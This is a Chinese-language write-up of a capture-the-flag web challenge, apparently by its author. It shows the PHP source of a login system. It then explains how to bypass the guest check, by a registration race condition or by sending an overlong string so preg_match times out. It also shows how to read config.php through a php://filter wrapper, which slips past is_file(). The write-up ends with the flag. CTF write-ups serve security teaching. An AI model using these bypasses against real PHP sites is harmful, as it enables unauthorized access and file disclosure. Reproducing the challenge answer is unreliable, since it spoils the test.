#wp
这题提示给了IDE，那么我们可以想到PHP有款强大的IDE叫做PHPSTORM，他新建项目的时候会生成一个.idea文件夹，访问发现有一个`workspace.xml`文件，访问里面发现了一个`xdcms2333.zip`。
下载可得到整站源码
`register.php`
```php
<?php
	include('config.php');
	try{
		$pdo = new PDO('mysql:host=localhost;dbname=xdcms', $user, $pass);
	}catch (Exception $e){
		die('mysql connected error');
	}
	$admin = "xdsec"."###".str_shuffle('you_are_the_member_of_xdsec_here_is_your_flag');
    $username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');
    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');
    $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : '';

    if (strlen($username) > 16 || strlen($username) > 16) {
        die('Invalid input');
    }

    $sth = $pdo->prepare('SELECT username FROM users WHERE username = :username');
    $sth->execute([':username' => $username]);
    if ($sth->fetch() !== false) {
        die('username has been registered');
    }

    $sth = $pdo->prepare('INSERT INTO users (username, password) VALUES (:username, :password)');
    $sth->execute([':username' => $username, ':password' => $password]);

    preg_match('/^(xdsec)((?:###|\w)+)$/i', $code, $matches);
    if (count($matches) === 3 && $admin === $matches[0]) {
        $sth = $pdo->prepare('INSERT INTO identities (username, identity) VALUES (:username, :identity)');
        $sth->execute([':username' => $username, ':identity' => $matches[1]]);
    } else {
        $sth = $pdo->prepare('INSERT INTO identities (username, identity) VALUES (:username, "GUEST")');
        $sth->execute([':username' => $username]);
    }
	echo '<script>alert("register success");location.href="./index.html"</script>';
```
`login.php`
```php
<?php
	session_start();
	include('config.php');
	try{
		$pdo = new PDO('mysql:host=localhost;dbname=xdcms', $user, $pass);
	}catch (Exception $e){
		die('mysql connected error');
	}
	$username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');
    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');

    if (strlen($username) > 32 || strlen($password) > 32) {
        die('Invalid input');
    }

    $sth = $pdo->prepare('SELECT password FROM users WHERE username = :username');
    $sth->execute([':username' => $username]);
    if ($sth->fetch()[0] !== $password) {
        die('wrong password');
    }
    $_SESSION['username'] = $username;
	unset($_SESSION['is_logined']);
	unset($_SESSION['is_guest']);
	#echo $username;
	header("Location: member.php");
?>
```
`member.php`
```php
<?php
	error_reporting(0);
	session_start();
	include('config.php');
	if (isset($_SESSION['username']) === false) {
        die('please login first');
    }
	try{
		$pdo = new PDO('mysql:host=localhost;dbname=xdcms', $user, $pass);
	}catch (Exception $e){
		die('mysql connected error');
	}
    $sth = $pdo->prepare('SELECT identity FROM identities WHERE username = :username');
    $sth->execute([':username' => $_SESSION['username']]);
    if ($sth->fetch()[0] === 'GUEST') {
        $_SESSION['is_guest'] = true;
    }

    $_SESSION['is_logined'] = true;
	if (isset($_SESSION['is_logined']) === false || isset($_SESSION['is_guest']) === true) {
        
    }else{
		if(isset($_GET['file'])===false)
			echo "None";
		elseif(is_file($_GET['file']))
			echo "you cannot give me a file";
		else
			readfile($_GET['file']);
	}
?>
```
这里我们首先看`register.php`,这里我弄一个坑，就是
```
$admin = $admin = "xdsec"."###".str_shuffle('you_are_the_member_of_xdsec_here_is_your_flag');
```
然后下面
```
preg_match('/^(xdsec)((?:###|\w)+)$/i', $code, $matches);
```
如果匹配了`$matches[0]=$admin`就可以把xdsec注册到identities表中，可样我们就可以绕过第一层,`member.php`中的
```
if ($sth->fetch()[0] === 'GUEST') {
        $_SESSION['is_guest'] = true;
    }
```
但是str_shuffle是不可预测的，不知道有没有人在这里被我坑到XD.但是真正的思路不在这里。    
下面说说我在后台审计中看到了很多人用的非预期解--条件竞争。
因为身份验证是用`if ($sth->fetch()[0] === 'GUEST')`那么如果在identities表中没有`username`这一行数据，那么取出来`$sth->fetch()[0]`结果就是null,还是可以绕过第一层，所以可以用python多线程注册用户，在
```
$sth = $pdo->prepare('INSERT INTO identities (username, identity) VALUES (:username, :identity)');
```
语句执行之前登陆上去就可以绕过第一层。    
其实正解是通过pre_match函数的资源消耗来绕过，因为pre_match在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，所以通过喂一个超长的字符串去给pre_match吃，导致pre_match消耗大量资源从而导致php超时，后面的php语句就不会执行。    
payload:
```
code=xdsec###AAAAAAAAAAAAAAAAAAA(超多个A）
```
然后再登陆既可以绕过第一层。
第二层则比较简单，利用一个phpbug。给出个实例
```
<?php
$a = '123.php';
$b = 'php://filter/resource=123.php';
var_dump(is_file($a));
var_dump(is_file($b));
?>

boolean true

boolean false
```
利用伪协议就可以绕过php的is_file，然后读取本目录下的config.php即可得到flag
```
LCTF{pr3_maTch_1s_A_amaz1ng_Function}
```

